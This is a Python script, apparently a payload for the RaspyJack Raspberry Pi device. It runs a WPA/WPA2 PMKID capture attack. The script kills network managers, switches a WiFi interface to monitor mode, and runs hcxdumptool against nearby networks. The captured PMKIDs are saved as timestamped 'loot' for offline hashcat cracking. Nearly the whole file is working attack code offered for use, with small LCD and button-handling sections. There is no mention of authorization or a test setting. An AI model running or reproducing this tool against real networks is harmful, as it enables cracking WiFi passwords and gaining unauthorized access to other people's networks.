#!/usr/bin/env python3
"""
RaspyJack *payload* – **WPA/WPA2 PMKID Capture**
=================================================
This script uses hcxdumptool to perform a PMKID-based attack against
WPA/WPA2 networks. This is a more modern technique that doesn't require
capturing a full 4-way handshake and doesn't need clients to be present.

The captured PMKIDs are saved to a .pcapng file in the loot/ directory,
which can then be converted to a hashcat-compatible format for offline
cracking.

It demonstrates how to:
1.  Properly initialize a WiFi interface for hcxdumptool.
2.  Run hcxdumptool as a subprocess and monitor its output.
3.  Parse the status output from hcxdumptool to display live stats.
4.  Save loot in a timestamped file.
5.  Exit cleanly and restore the interface state.
"""

# ---------------------------------------------------------------------------
# 0) Imports & boilerplate
# ---------------------------------------------------------------------------
import os, sys, subprocess, signal, time, re, threading
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))

# ---------------------------- Third‑party libs ----------------------------
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# ---------------------------------------------------------------------------
# 1) GPIO mapping (BCM)
# ---------------------------------------------------------------------------
PINS: dict[str, int] = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13,
    "KEY1": 21, "KEY2": 20, "KEY3": 16,
}

# ---------------------------------------------------------------------------
# 2) GPIO & LCD initialisation
# ---------------------------------------------------------------------------
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT = ImageFont.load_default()
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT_STATUS = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 10)

# ---------------------------------------------------------------------------
# 3) Global State & Configuration
# ---------------------------------------------------------------------------
WIFI_INTERFACE = "wlan1"  # Default interface, must support monitor mode
LOOT_DIR = "/root/Raspyjack/loot/PMKID/"
running = True
attack_process = None
status_lines = ["Waiting to start..."]

# ---------------------------------------------------------------------------
# 4) Graceful shutdown
# ---------------------------------------------------------------------------
def cleanup(*_):
    """Signal handler to stop the main loop and attack process."""
    global running
    if running:
        running = False
        if attack_process:
            # Send SIGINT to hcxdumptool for a clean shutdown
            try:
                os.kill(attack_process.pid, signal.SIGINT)
            except ProcessLookupError:
                pass

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# ---------------------------------------------------------------------------
# 5) WiFi & Attack Functions
# ---------------------------------------------------------------------------

def prepare_interface(enable: bool):
    """Enables or disables monitor mode on the interface."""
    try:
        if enable:
            # Kill interfering processes
            subprocess.run("pkill wpa_supplicant", shell=True)
            subprocess.run("pkill dhclient", shell=True)
            time.sleep(1)
            
            subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True, check=True)
            subprocess.run(f"iwconfig {WIFI_INTERFACE} mode monitor", shell=True, check=True)
            subprocess.run(f"ifconfig {WIFI_INTERFACE} up", shell=True, check=True)
            
            result = subprocess.check_output(f"iwconfig {WIFI_INTERFACE}", shell=True).decode()
            return "Mode:Monitor" in result
        else: # Disable
            subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True)
            subprocess.run(f"iwconfig {WIFI_INTERFACE} mode managed", shell=True)
            subprocess.run(f"ifconfig {WIFI_INTERFACE} up", shell=True)
            # Optionally, restart networking
            # subprocess.run("systemctl restart dhcpcd", shell=True)
            return True
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(f"Error preparing interface: {e}", file=sys.stderr)
        return False

def run_attack():
    """Runs hcxdumptool and monitors its output."""
    global attack_process, status_lines
    
    os.makedirs(LOOT_DIR, exist_ok=True)
    timestamp = time.strftime("%Y-%m-%d_%H%M%S")
    output_file = os.path.join(LOOT_DIR, f"pmkid_{timestamp}.pcapng")
    
    command = [
        "hcxdumptool",
        "-i", WIFI_INTERFACE,
        "-o", output_file,
        "--enable_status=1" # Enable machine-readable status output
    ]
    
    # hcxdumptool outputs status info to stderr
    attack_process = subprocess.Popen(command, stderr=subprocess.PIPE, text=True)
    
    while running and attack_process.poll() is None:
        line = attack_process.stderr.readline()
        if not line:
            break
        
        # Simple parsing of hcxdumptool status line
        # Example: [20:06:21 - 002] 0 / 4 APs (0 PMKIDs)
        parts = line.strip().split(']')
        if len(parts) > 1:
            status_text = parts[1].strip()
            
            # Extract key metrics
            ap_count = re.search(r'(\d+)\s+/\s*(\d+)\s+APs', status_text)
            pmkid_count = re.search(r'(\d+)\s+PMKIDs', status_text)
            
            ap_str = f"APs: {ap_count.group(2)}" if ap_count else "APs: N/A"
            pmkid_str = f"PMKIDs: {pmkid_count.group(1)}" if pmkid_count else "PMKIDs: 0"
            
            status_lines = [
                "hcxdumptool running...",
                ap_str,
                pmkid_str,
                f"File: pmkid_{timestamp}.pcapng"
            ]

    if running: # If loop exited but we weren't told to stop, it's an error
        status_lines = ["hcxdumptool", "crashed or exited.", "Check logs."]
    else:
        status_lines = ["Attack stopped.", f"File saved in:", f"{LOOT_DIR}"]

# ---------------------------------------------------------------------------
# 6) UI and Drawing Functions
# ---------------------------------------------------------------------------

def draw_ui(status: str):
    """Draws the main UI."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)

    d.text((5, 5), "PMKID Capture Attack", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)

    status_color = "lime" if status == "ACTIVE" else "red"
    d.text((30, 30), status, font=FONT_STATUS, fill=status_color)

    y_pos = 50
    for line in status_lines:
        d.text((5, y_pos), line, font=FONT_STATUS, fill="white")
        y_pos += 12

    d.text((5, 110), "OK=Start/Stop | KEY3=Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_message(message: str, color: str = "yellow"):
    """Draws a status message on the screen."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    bbox = d.textbbox((0, 0), message, font=FONT_TITLE)
    w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
    x = (WIDTH - w) // 2
    y = (HEIGHT - h) // 2
    d.text((x, y), message, font=FONT_TITLE, fill=color)
    LCD.LCD_ShowImage(img, 0, 0)

# ---------------------------------------------------------------------------
# 7) Main Loop
# ---------------------------------------------------------------------------
try:
    is_attacking = False
    
    # Check for hcxdumptool
    if subprocess.run("which hcxdumptool", shell=True, capture_output=True).returncode != 0:
        draw_message("hcxdumptool not found!", "red")
        time.sleep(5)
        raise SystemExit("hcxdumptool not found")

    draw_message("Preparing interface...")
    if not prepare_interface(True):
        draw_message("Monitor Mode FAILED", "red")
        time.sleep(3)
        raise SystemExit("Failed to enable monitor mode")

    while running:
        draw_ui("ACTIVE" if is_attacking else "STOPPED")
        
        # Wait for button press
        button_pressed = False
        start_wait = time.time()
        while time.time() - start_wait < 1.0 and not button_pressed:
            if GPIO.input(PINS["KEY3"]) == 0:
                cleanup()
                break
            
            if GPIO.input(PINS["OK"]) == 0:
                is_attacking = not is_attacking
                if is_attacking:
                    status_lines = ["Starting attack..."]
                    threading.Thread(target=run_attack, daemon=True).start()
                else:
                    if attack_process:
                        os.kill(attack_process.pid, signal.SIGINT)
                    status_lines = ["Stopping attack..."]
                
                button_pressed = True
                time.sleep(0.3) # Debounce
                break
            
            time.sleep(0.05)
        
        if not running:
            break

except (KeyboardInterrupt, SystemExit):
    pass
except Exception as e:
    print(f"[ERROR] {e}", file=sys.stderr)
    draw_message(f"ERROR:\n{str(e)[:20]}", "red")
    time.sleep(3)
finally:
    cleanup()
    draw_message("Cleaning up...")
    prepare_interface(False)
    LCD.LCD_Clear()
    GPIO.cleanup()
    print("PMKID Capture payload finished.")
